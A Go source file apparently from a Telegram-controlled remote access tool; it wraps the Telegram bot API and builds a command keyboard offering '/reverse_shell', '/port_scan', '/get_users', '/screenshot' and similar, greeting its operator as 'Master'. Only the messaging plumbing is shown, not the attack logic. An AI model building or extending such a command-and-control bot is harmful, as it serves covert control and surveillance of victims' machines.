package telegram

import (
	"log"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

type BotRepository struct {
	BOT *tgbotapi.BotAPI
}

func GetBot(apiKey string, debugMode bool) *BotRepository {
	bot, err := tgbotapi.NewBotAPI(apiKey)
	if err != nil {
		log.Panic(err)
	}
	bot.Debug = debugMode
	return &BotRepository{BOT: bot}
}

func (b *BotRepository) SendMessage(chatId int64, text string) {
	msg := tgbotapi.NewMessage(chatId, text)
	b.BOT.Send(msg)
}

func (b *BotRepository) SendPhoto(chatID int64, photoPath string) {
	msg := tgbotapi.NewPhotoUpload(chatID, photoPath)
	b.BOT.Send(msg)
}

func (b *BotRepository) GetUpdates() (tgbotapi.UpdatesChannel, error) {
	return b.BOT.GetUpdatesChan(tgbotapi.UpdateConfig{
		Offset:  0,
		Timeout: 60,
	})
}

func (b *BotRepository) UpdateKeyboard(chatID int64) {
	var numericKeyboard = tgbotapi.NewReplyKeyboard(
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/reverse_shell"),
			tgbotapi.NewKeyboardButton("/port_scan"),
			tgbotapi.NewKeyboardButton("/get_users"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/whoami"),
			tgbotapi.NewKeyboardButton("/screenshot"),
			tgbotapi.NewKeyboardButton("/os"),
		),
	)
	msg := tgbotapi.NewMessage(chatID, "Hello Master, I'm here to serve you.")
	msg.ReplyMarkup = numericKeyboard
	b.BOT.Send(msg)
}
